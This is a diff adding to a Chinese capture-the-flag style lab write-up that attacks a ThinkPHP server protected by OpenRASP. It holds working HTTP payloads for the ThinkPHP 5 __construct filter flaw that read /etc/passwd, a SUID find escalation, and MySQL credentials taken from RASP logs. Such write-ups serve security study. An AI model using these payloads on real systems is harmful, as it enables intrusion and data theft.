@@ -19,6 +19,15 @@ Tags
 39.98.110.213
 ```
 
+单层靶场环境，没有 Windows 机器
+
+| Name       | IP            | Note                                                     |
+| :--------- | :------------ | :------------------------------------------------------- |
+| Entrypoint | 172.22.10.22  | 任意文件下载 + Shiro 反序列化 -> flag1                   |
+| OpenRASP   | 172.22.10.3   | THinkPHP + OpenRASP -> flag2                             |
+| Unknown    | 172.22.10.154 | Apache + ThinkPHP V5.1.41 LTS  API -> 172.22.10.155:9501 |
+| Unknown    | 172.22.10.155 | swoole-http-server                                       |
+
 ## 入口点探测
 
 按照常规思路，直接上 fscan 进行扫描
@@ -430,4 +439,328 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 ```shell
 ```
 
-TODO RASP 暂时没有思路绕过去
+## 172.22.10.3 ThinkPHP + OpenRASP
+
+工具扫描结果
+
+```plaintext
+[+] http://172.22.10.3 的检测结果如下：
+=====================================================================
+[-] 目标不存在tp6_session_file_write漏洞
+[-] 目标不存在tp5_invoke_func_code_exec_1漏洞
+[-] 目标不存在tp_cache漏洞
+[-] 目标不存在tp5_construct_debug_rce漏洞
+[+] 目标存在tp5_construct_code_exec_1漏洞
+[-] 目标不存在tp5_file_include漏洞
+[+] 目标存在tp5_construct_code_exec_2漏洞
+[-] 目标不存在tp_pay_orderid_sqli漏洞
+[-] 目标不存在tp5_method_filter_code_exec漏洞
+[-] 目标不存在tp5_dbinfo_leak漏洞
+[-] 目标不存在tp5_construct_code_exec_4漏洞
+[-] 目标不存在tp5_debug_index_ids_sqli漏洞
+[-] 目标不存在tp5_index_showid_rce漏洞
+[-] 目标不存在tp2_lite_code_exec漏洞
+[-] 目标不存在tp5_invoke_func_code_exec_2漏洞
+[-] 目标不存在tp5_templalte_driver_rce漏洞
+[-] 目标不存在tp5_driver_display_rce漏洞
+[-] 目标不存在tp5_request_input_rce漏洞
+[-] 目标不存在tp5_construct_code_exec_3漏洞
+[-] 目标不存在tp5_session_include漏洞
+[-] 目标不存在tp_update_sql漏洞
+[-] 目标不存在tp_view_recent_xff_sqli漏洞
+[-] 目标不存在tp_multi_sql_leak漏洞
+[-] 目标不存在tp_checkcode_time_sqli漏洞
+[-] 目标不存在tp5_index_construct_rce漏洞
+```
+
+利用 tp5_construct_code 来进行攻击，但是由于存在有 OpenRASP 漏洞，所以不寻求命令执行，而是走LFI
+
+```plaintext
+POST /index.php?s=captcha HTTP/1.1
+Accept: */*
+User-Agent: Thunder Client (https://www.thunderclient.com)
+Content-Type: application/x-www-form-urlencoded
+Host: 8.129.29.180:10008
+Content-Length: 83
+
+_method=__construct&filter[]=readfile&method=get&server[REQUEST_METHOD]=/etc/passwd
+```
+
+即可得到返回
+
+```plaintext
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System
+(admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network
+Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time
+Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+ubuntu:x:1000:1000:openrasp:/home/ubuntu:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
+```
+
+在已经确定存在有 tp5_construct_code 并且链子可通的情况下，尝试读取 OpenRASP 策略
+
+```plaintext
+POST /index.php?s=captcha HTTP/1.1
+Accept: */*
+User-Agent: Thunder Client (https://www.thunderclient.com)
+Content-Type: application/x-www-form-urlencoded
+Host: 8.129.29.180:10008
+Content-Length: 96
+
+_method=__construct&filter[]=readfile&method=get&server[REQUEST_METHOD]=/opt/plugins/official.js
+```
+
+返回的结果为 [official.js](./attachment/official.js)
+
+参考 [Blackmaze - C1trus](https://c1trus.top/37-machineswp/1-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/machines/blackmaze.html)
+
+使用 concat_function UAF 配合链子，绕过 OpenRASP 实现 system 命令执行
+
+参考 [deploy_shell.py](./attachment/deploy_shell.py) [get_shell.py](./attachment/get_shell.py)
+
+尝试检索 suid 程序
+
+```shell
+(remote) www-data@openrasp:/var/www/html/public$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/bin/su
+/usr/bin/umount
+/usr/bin/gpasswd
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/fusermount
+/usr/bin/pkexec
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/at
+```
+
+读取 flag
+
+```shell
+(remote) www-data@openrasp:/var/www/html/public$ /usr/bin/find /flag -exec cat {} \;
+flag{0df84b0d-dd43-469e-b454-a1404bfd49e4}
+```
+
+## 172.22.10.3 信息收集
+
+检查进程的过程中，发现存在有 mysql 进程
+
+并且在 OpenRASP 日志中，发现 Mysql 连接凭据
+
+```json title="/opt/logs/alarm/alarm.log.2025-01-20"
+{"app_id":"","attack_params":{"error_code":"1064","error_msg":"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`agent_level_task' at line 1","query":"DROP TABLE IF EXISTS `agent_level_task","server":"mysql","stack":["/var/www/html/crmeb/public/install/index.php@mysqli_query:305"]},"attack_source":"192.168.230.1","attack_type":"sql_exception","body":"","client_ip":"","event_time":"2025-01-20T06:12:42+0000","event_type":"attack","header":{"accept":"application/json, text/javascript, */*; q=0.01","accept-encoding":"gzip, deflate","accept-language":"zh-CN,zh;q=0.9","connection":"keep-alive","content-length":"235","content-type":"application/x-www-form-urlencoded; charset=UTF-8","host":"192.168.230.151","origin":"http://192.168.230.151","referer":"http://192.168.230.151/install/index.php?step=4","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36","x-requested-with":"XMLHttpRequest"},"intercept_state":"log","parameter":{"form":"{\"dbuser\":\"root\",\"dbpw\":\"9dab8ee6-1721-4e01-8789-1ab09053a1e7\",\"dbname\":\"crmeb\",\"dbhost\":\"127.0.0.1\",\"dbport\":\"3306\",\"dbprefix\":\"eb_\",\"demo\":\"demo\",\"manager\":\"admin\",\"manager_pwd\":\"admin123\",\"manager_ckpwd\":\"admin123\",\"cache_type\":\"0\",\"rbhost\":\"127.0.0.1\",\"rbport\":\"6379\",\"rbselect\":\"0\",\"rbpw\":\"\"}","json":"{}","multipart":"[]"},"path":"/install/index.php","plugin_algorithm":"sql_exception","plugin_confidence":70,"plugin_message":"mysql error 1064 detected: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '`agent_level_task' at line 1","plugin_name":"official","rasp_id":"e9b902d621f795181b8fdb7fa0db7b7c","request_id":"2e3d03c73ecb679c000008e472ca1cd8","request_method":"post","server_hostname":"openrasp","server_ip":"192.168.230.151","server_nic":[{"ip":"192.168.230.151","name":"ens32"}],"server_type":"php","server_version":"7.4.33","source_code":[],"target":"192.168.230.151","url":"http://192.168.230.151/install/index.php?step=4&install=1&n=1"}
+```
+
+尝试连接
+
+```sql
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| crmeb              |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use crmeb
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables;
++-----------------------------------+
+| Tables_in_crmeb                   |
++-----------------------------------+
+| eb_agent_level                    |
+| eb_agent_level_task               |
+| eb_agent_level_task_record        |
+| eb_agreement                      |
+| eb_app_version                    |
+| eb_article                        |
+| eb_article_category               |
+| eb_article_content                |
+| eb_auxiliary                      |
+| eb_cache                          |
+| eb_capital_flow                   |
+| eb_category                       |
+| eb_delivery_service               |
+| eb_division_agent_apply           |
+| eb_diy                            |
+| eb_express                        |
+| eb_lang_code                      |
+| eb_lang_country                   |
+| eb_lang_type                      |
+| eb_live_anchor                    |
+| eb_live_goods                     |
+| eb_live_room                      |
+| eb_live_room_goods                |
+| eb_luck_lottery                   |
+| eb_luck_lottery_record            |
+| eb_luck_prize                     |
+| eb_member_card                    |
+| eb_member_card_batch              |
+| eb_member_right                   |
+| eb_member_ship                    |
+| eb_message_system                 |
+| eb_other_order                    |
+| eb_other_order_status             |
+| eb_out_account                    |
+| eb_out_interface                  |
+| eb_page_categroy                  |
+| eb_page_link                      |
+| eb_qrcode                         |
+| eb_routine_scheme                 |
+| eb_shipping_templates             |
+| eb_shipping_templates_free        |
+| eb_shipping_templates_no_delivery |
+| eb_shipping_templates_region      |
+| eb_sms_record                     |
+| eb_store_advance                  |
+| eb_store_bargain                  |
+| eb_store_bargain_user             |
+| eb_store_bargain_user_help        |
+| eb_store_cart                     |
+| eb_store_category                 |
+| eb_store_combination              |
+| eb_store_coupon_issue             |
+| eb_store_coupon_issue_user        |
+| eb_store_coupon_product           |
+| eb_store_coupon_user              |
+| eb_store_integral                 |
+| eb_store_integral_order           |
+| eb_store_integral_order_status    |
+| eb_store_order                    |
+| eb_store_order_cart_info          |
+| eb_store_order_economize          |
+| eb_store_order_invoice            |
+| eb_store_order_refund             |
+| eb_store_order_status             |
+| eb_store_pink                     |
+| eb_store_product                  |
+| eb_store_product_attr             |
+| eb_store_product_attr_result      |
+| eb_store_product_attr_value       |
+| eb_store_product_cate             |
+| eb_store_product_coupon           |
+| eb_store_product_description      |
+| eb_store_product_log              |
+| eb_store_product_relation         |
+| eb_store_product_reply            |
+| eb_store_product_rule             |
+| eb_store_product_virtual          |
+| eb_store_seckill                  |
+| eb_store_seckill_time             |
+| eb_store_service                  |
+| eb_store_service_feedback         |
+| eb_store_service_log              |
+| eb_store_service_record           |
+| eb_store_service_speechcraft      |
+| eb_store_visit                    |
+| eb_system_admin                   |
+| eb_system_attachment              |
+| eb_system_attachment_category     |
+| eb_system_city                    |
+| eb_system_config                  |
+| eb_system_config_tab              |
+| eb_system_crud                    |
+| eb_system_crud_data               |
+| eb_system_crud_list               |
+| eb_system_event                   |
+| eb_system_event_data              |
+| eb_system_file                    |
+| eb_system_file_info               |
+| eb_system_group                   |
+| eb_system_group_data              |
+| eb_system_log                     |
+| eb_system_menus                   |
+| eb_system_notice                  |
+| eb_system_notice_admin            |
+| eb_system_notification            |
+| eb_system_role                    |
+| eb_system_route                   |
+| eb_system_route_cate              |
+| eb_system_sign_reward             |
+| eb_system_storage                 |
+| eb_system_store                   |
+| eb_system_store_staff             |
+| eb_system_timer                   |
+| eb_system_user_level              |
+| eb_upgrade_log                    |
+| eb_user                           |
+| eb_user_address                   |
+| eb_user_bill                      |
+| eb_user_brokerage                 |
+| eb_user_brokerage_frozen          |
+| eb_user_cancel                    |
+| eb_user_enter                     |
+| eb_user_extract                   |
+| eb_user_friends                   |
+| eb_user_group                     |
+| eb_user_invoice                   |
+| eb_user_label                     |
+| eb_user_label_relation            |
+| eb_user_level                     |
+| eb_user_money                     |
+| eb_user_notice                    |
+| eb_user_notice_see                |
+| eb_user_recharge                  |
+| eb_user_search                    |
+| eb_user_sign                      |
+| eb_user_spread                    |
+| eb_user_visit                     |
+| eb_wechat_key                     |
+| eb_wechat_media                   |
+| eb_wechat_message                 |
+| eb_wechat_news_category           |
+| eb_wechat_qrcode                  |
+| eb_wechat_qrcode_cate             |
+| eb_wechat_qrcode_record           |
+| eb_wechat_reply                   |
+| eb_wechat_user                    |
++-----------------------------------+
+```
